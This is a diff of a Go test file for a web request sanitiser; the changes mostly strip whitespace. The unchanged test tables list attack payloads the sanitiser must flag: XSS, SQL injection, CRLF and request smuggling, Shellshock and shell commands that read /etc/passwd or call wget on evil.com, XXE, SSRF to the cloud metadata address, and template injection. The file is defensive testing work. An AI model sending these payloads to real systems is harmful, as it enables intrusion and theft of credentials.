@@ -37,7 +37,7 @@ func TestSQLInjectionDetection(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			req := httptest.NewRequest("GET", tt.input, nil)
 			result := sanitize.IsMalicious(req)
-			
+
 			if result != tt.expected {
 				if tt.expected && !result {
 					t.Errorf("MISSED: %s - Expected malicious but passed", tt.name)
@@ -86,7 +86,7 @@ func TestXSSDetection(t *testing.T) {
 		{"Clean HTML entities", "/?msg=Hello+&amp;+goodbye", false, "clean"},
 		{"Clean punctuation", "/?msg=Test!+Question?+Yes.", false, "clean"},
 		{"Clean markdown", "/?msg=**bold**+and+*italic*", false, "clean"},
-		
+
 		// Basic XSS
 		{"Basic script tag", "/?msg=<script>alert(1)</script>", true, "basic"},
 		{"Script with src", "/?msg=<script+src='evil.js'></script>", true, "basic"},
@@ -203,11 +203,11 @@ func TestXSSDetection(t *testing.T) {
 		if tt.expected {
 			totalMalicious++
 		}
-		
+
 		t.Run(tt.name, func(t *testing.T) {
 			req := httptest.NewRequest("GET", tt.input, nil)
 			result := sanitize.IsMalicious(req)
-			
+
 			if categoryResults[tt.category].total == 0 {
 				categoryResults[tt.category] = struct {
 					total    int
@@ -215,10 +215,10 @@ func TestXSSDetection(t *testing.T) {
 					missed   []string
 				}{0, 0, []string{}}
 			}
-			
+
 			cr := categoryResults[tt.category]
 			cr.total++
-			
+
 			if result != tt.expected {
 				if tt.expected && !result {
 					t.Errorf("MISSED: %s - Expected malicious but passed", tt.name)
@@ -232,7 +232,7 @@ func TestXSSDetection(t *testing.T) {
 				detected++
 				cr.detected++
 			}
-			
+
 			categoryResults[tt.category] = cr
 		})
 	}
@@ -245,7 +245,7 @@ func TestXSSDetection(t *testing.T) {
 				maliciousInCat++
 			}
 		}
-		
+
 		if maliciousInCat > 0 {
 			detRate := float64(res.detected) / float64(maliciousInCat) * 100
 			t.Logf("\n%s:", cat)
@@ -267,7 +267,7 @@ func TestXSSDetection(t *testing.T) {
 	t.Logf("False positives: %d", falsePositives)
 	t.Logf("Detection rate: %.2f%%", detectionRate)
 	t.Logf("False positive rate: %.2f%%", fpRate)
-	
+
 	if detectionRate < 75.0 {
 		t.Logf("\nWARNING: XSS detection rate below 75%% - consider improving filters")
 	}
@@ -286,7 +286,7 @@ func TestHeaderInjection(t *testing.T) {
 		{"Valid User-Agent", "User-Agent", "Mozilla/5.0", false, "clean"},
 		{"Valid Content-Type", "Content-Type", "application/json", false, "clean"},
 		{"Valid Accept", "Accept", "text/html,application/json", false, "clean"},
-		
+
 		// CRLF injection
 		{"CRLF injection basic", "X-Custom", "value\r\nInjected-Header: evil", true, "crlf"},
 		{"CRLF with LF only", "X-Custom", "value\nSet-Cookie: session=hijacked", true, "crlf"},
@@ -294,39 +294,39 @@ func TestHeaderInjection(t *testing.T) {
 		{"Double CRLF response splitting", "X-Custom", "value\r\n\r\n<script>alert(1)</script>", true, "crlf"},
 		{"CRLF URL encoded", "X-Custom", "value%0d%0aInjected: evil", true, "crlf"},
 		{"CRLF double encoded", "X-Custom", "value%250d%250aInjected: evil", true, "crlf"},
-		
+
 		// Null byte injection
 		{"Null byte attack", "X-Custom", "value\x00malicious", true, "null"},
 		{"Null byte truncation", "X-Custom", "safe\x00<script>alert(1)</script>", true, "null"},
 		{"Multiple null bytes", "X-Custom", "\x00\x00\x00evil", true, "null"},
-		
+
 		// HTTP smuggling patterns
 		{"Transfer-Encoding smuggling", "Transfer-Encoding", "chunked\r\n\r\n0\r\n\r\nGET /admin", true, "smuggling"},
 		{"Content-Length mismatch", "Content-Length", "5\r\nContent-Length: 100", true, "smuggling"},
 		{"CL-TE smuggling", "X-Custom", "GET /\r\nContent-Length: 4\r\nTransfer-Encoding: chunked", true, "smuggling"},
 		{"TE-CL smuggling", "X-Custom", "POST /\r\nTransfer-Encoding: chunked\r\nContent-Length: 4", true, "smuggling"},
-		
+
 		// Header pollution
 		{"Duplicate Host header", "Host", "evil.com\r\nHost: victim.com", true, "pollution"},
 		{"Multiple X-Forwarded-For", "X-Forwarded-For", "127.0.0.1\r\nX-Forwarded-For: attacker.com", true, "pollution"},
 		{"Cookie pollution", "Cookie", "session=abc\r\nCookie: admin=true", true, "pollution"},
-		
+
 		// Cache poisoning
 		{"X-Forwarded-Host inject", "X-Forwarded-Host", "evil.com\r\nCache-Control: public", true, "poisoning"},
 		{"X-Original-URL", "X-Original-URL", "/admin\r\nX-Rewrite-URL: /public", true, "poisoning"},
 		{"Vary header manipulation", "Vary", "User-Agent\r\nVary: *", true, "poisoning"},
-		
+
 		// Authorization bypass
 		{"X-Original-URL bypass", "X-Original-URL", "/admin", true, "authz-bypass"},
 		{"X-Rewrite-URL bypass", "X-Rewrite-URL", "/admin", true, "authz-bypass"},
 		{"X-Forwarded-For localhost", "X-Forwarded-For", "127.0.0.1", true, "authz-bypass"},
 		{"X-Custom-IP-Authorization", "X-Custom-IP-Authorization", "127.0.0.1", true, "authz-bypass"},
-		
+
 		// XSS via headers
 		{"User-Agent XSS", "User-Agent", "<script>alert(1)</script>", true, "xss"},
 		{"Referer XSS", "Referer", "javascript:alert(1)", true, "xss"},
 		{"X-Forwarded-For XSS", "X-Forwarded-For", "<img src=x onerror=alert(1)>", true, "xss"},
-		
+
 		// Command injection
 		{"User-Agent command", "User-Agent", "() { :; }; /bin/bash -c 'cat /etc/passwd'", true, "command"},
 		{"Via header command", "Via", "`cat /etc/passwd`", true, "command"},
@@ -348,12 +348,12 @@ func TestHeaderInjection(t *testing.T) {
 		if tt.expected {
 			totalMalicious++
 		}
-		
+
 		t.Run(tt.name, func(t *testing.T) {
 			req := httptest.NewRequest("GET", "/", nil)
 			req.Header.Set(tt.header, tt.value)
 			result := sanitize.IsMalicious(req)
-			
+
 			if categoryResults[tt.category].total == 0 {
 				categoryResults[tt.category] = struct {
 					total    int
@@ -361,10 +361,10 @@ func TestHeaderInjection(t *testing.T) {
 					missed   []string
 				}{0, 0, []string{}}
 			}
-			
+
 			cr := categoryResults[tt.category]
 			cr.total++
-			
+
 			if result != tt.expected {
 				if tt.expected && !result {
 					t.Errorf("MISSED: %s - Expected malicious but passed", tt.name)
@@ -378,7 +378,7 @@ func TestHeaderInjection(t *testing.T) {
 				detected++
 				cr.detected++
 			}
-			
+
 			categoryResults[tt.category] = cr
 		})
 	}
@@ -391,7 +391,7 @@ func TestHeaderInjection(t *testing.T) {
 				maliciousInCat++
 			}
 		}
-		
+
 		if maliciousInCat > 0 {
 			detRate := float64(res.detected) / float64(maliciousInCat) * 100
 			t.Logf("\n%s:", cat)
@@ -415,7 +415,6 @@ func TestHeaderInjection(t *testing.T) {
 	t.Logf("False positive rate: %.2f%%", fpRate)
 }
 
-
 // Test POST form sanitization
 func TestPOSTFormSanitization(t *testing.T) {
 	tests := []struct {
@@ -428,67 +427,67 @@ func TestPOSTFormSanitization(t *testing.T) {
 		{"Clean form", map[string]string{"user": "john", "email": "test@example.com"}, false, "clean"},
 		{"Valid JSON", map[string]string{"data": `{"name":"test","age":25}`}, false, "clean"},
 		{"Normal password", map[string]string{"password": "S3cur3P@ss!"}, false, "clean"},
-		
+
 		// XSS in forms
 		{"Basic XSS", map[string]string{"msg": "<script>alert(1)</script>"}, true, "xss"},
 		{"Event handler", map[string]string{"comment": "<img src=x onerror=alert(1)>"}, true, "xss"},
 		{"SVG injection", map[string]string{"bio": "<svg onload=alert(1)>"}, true, "xss"},
 		{"JavaScript URL", map[string]string{"url": "javascript:alert(1)"}, true, "xss"},
 		{"Data URI XSS", map[string]string{"link": "data:text/html,<script>alert(1)</script>"}, true, "xss"},
-		
+
 		// SQL injection in forms
 		{"Classic SQL", map[string]string{"id": "1' OR '1'='1"}, true, "sqli"},
 		{"Union-based", map[string]string{"search": "' UNION SELECT password FROM users--"}, true, "sqli"},
 		{"Stacked query", map[string]string{"id": "1; DROP TABLE users--"}, true, "sqli"},
 		{"Time-based blind", map[string]string{"id": "1' AND SLEEP(5)--"}, true, "sqli"},
 		{"Boolean blind", map[string]string{"user": "admin' AND 1=1--"}, true, "sqli"},
-		
+
 		// Command injection
 		{"Shell command", map[string]string{"file": "; cat /etc/passwd"}, true, "command"},
 		{"Pipe command", map[string]string{"name": "test | whoami"}, true, "command"},
 		{"Backtick exec", map[string]string{"input": "`id`"}, true, "command"},
 		{"Command substitution", map[string]string{"param": "$(wget evil.com)"}, true, "command"},
 		{"Shellshock", map[string]string{"agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"}, true, "command"},
-		
+
 		// Path traversal
 		{"Directory traversal", map[string]string{"file": "../../../etc/passwd"}, true, "traversal"},
 		{"Windows path", map[string]string{"path": "..\\..\\..\\windows\\system32\\config\\sam"}, true, "traversal"},
 		{"Encoded traversal", map[string]string{"file": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"}, true, "traversal"},
 		{"Double encoding", map[string]string{"file": "..%252f..%252f..%252fetc%252fpasswd"}, true, "traversal"},
-		
+
 		// LDAP injection
 		{"LDAP injection", map[string]string{"user": "*)(uid=*))(|(uid=*"}, true, "ldap"},
 		{"LDAP bypass", map[string]string{"filter": "admin)(&(password=*"}, true, "ldap"},
-		
+
 		// XML injection
 		{"XXE attack", map[string]string{"xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"}, true, "xml"},
 		{"XML bomb", map[string]string{"data": "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;\">]><lolz>&lol1;</lolz>"}, true, "xml"},
-		
+
 		// SSRF
 		{"SSRF localhost", map[string]string{"url": "http://localhost:8080/admin"}, true, "ssrf"},
 		{"SSRF 127.0.0.1", map[string]string{"callback": "http://127.0.0.1/secrets"}, true, "ssrf"},
 		{"SSRF metadata", map[string]string{"endpoint": "http://169.254.169.254/latest/meta-data/"}, true, "ssrf"},
 		{"SSRF file protocol", map[string]string{"resource": "file:///etc/passwd"}, true, "ssrf"},
-		
+
 		// Template injection
 		{"SSTI Jinja2", map[string]string{"template": "{{config.items()}}"}, true, "ssti"},
 		{"SSTI eval", map[string]string{"expr": "${7*7}"}, true, "ssti"},
 		{"SSTI Ruby", map[string]string{"template": "<%= system('cat /etc/passwd') %>"}, true, "ssti"},
-		
+
 		// NoSQL injection
 		{"NoSQL bypass", map[string]string{"user": `{"$gt": ""}`}, true, "nosql"},
 		{"MongoDB injection", map[string]string{"filter": `{"$ne": null}`}, true, "nosql"},
 		{"NoSQL operator", map[string]string{"query": `{$where: "this.credits == this.debits"}`}, true, "nosql"},
-		
+
 		// Multipart/form-data attacks
 		{"File upload PHP", map[string]string{"filename": "shell.php"}, true, "upload"},
 		{"Double extension", map[string]string{"file": "image.jpg.php"}, true, "upload"},
 		{"Null byte upload", map[string]string{"name": "shell.php%00.jpg"}, true, "upload"},
-		
+
 		// CRLF injection
 		{"CRLF in form", map[string]string{"header": "value\r\nSet-Cookie: admin=true"}, true, "crlf"},
 		{"Response splitting", map[string]string{"redirect": "/page\r\n\r\n<script>alert(1)</script>"}, true, "crlf"},
-		
+
 		// Expression language injection
 		{"EL injection", map[string]string{"expr": "${applicationScope}"}, true, "el"},
 		{"OGNL injection", map[string]string{"input": "%{#context['xwork.MethodAccessor.denyMethodExecution']=false}"}, true, "el"},
@@ -509,17 +508,17 @@ func TestPOSTFormSanitization(t *testing.T) {
 		if tt.expected {
 			totalMalicious++
 		}
-		
+
 		t.Run(tt.name, func(t *testing.T) {
 			form := url.Values{}
 			for k, v := range tt.formData {
 				form.Set(k, v)
 			}
-			
+
 			req := httptest.NewRequest("POST", "/", bytes.NewBufferString(form.Encode()))
 			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 			result := sanitize.IsMalicious(req)
-			
+
 			if categoryResults[tt.category].total == 0 {
 				categoryResults[tt.category] = struct {
 					total    int
@@ -527,10 +526,10 @@ func TestPOSTFormSanitization(t *testing.T) {
 					missed   []string
 				}{0, 0, []string{}}
 			}
-			
+
 			cr := categoryResults[tt.category]
 			cr.total++
-			
+
 			if result != tt.expected {
 				if tt.expected && !result {
 					t.Errorf("MISSED: %s - Expected malicious but passed", tt.name)
@@ -544,7 +543,7 @@ func TestPOSTFormSanitization(t *testing.T) {
 				detected++
 				cr.detected++
 			}
-			
+
 			categoryResults[tt.category] = cr
 		})
 	}
@@ -557,7 +556,7 @@ func TestPOSTFormSanitization(t *testing.T) {
 				maliciousInCat++
 			}
 		}
-		
+
 		if maliciousInCat > 0 {
 			detRate := float64(res.detected) / float64(maliciousInCat) * 100
 			t.Logf("\n%s:", cat)
@@ -580,7 +579,6 @@ func TestPOSTFormSanitization(t *testing.T) {
 	t.Logf("Detection rate: %.2f%%", detectionRate)
 	t.Logf("False positive rate: %.2f%%", fpRate)
 }
-
 
 // Benchmark attack detection performance
 func BenchmarkSQLInjectionDetection(b *testing.B) {
